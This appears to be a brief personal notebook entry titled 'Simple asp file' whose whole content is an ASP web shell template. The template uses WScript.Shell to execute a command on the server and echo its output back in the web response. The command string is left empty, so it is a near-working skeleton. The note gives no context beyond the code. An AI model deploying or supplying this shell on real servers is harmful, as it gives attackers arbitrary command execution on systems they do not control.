---
publish: true
created: 2026-02-26T13:59:22.270+05:30
modified: 2026-06-23T12:11:45.732+05:30
---

Simple asp file

```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```
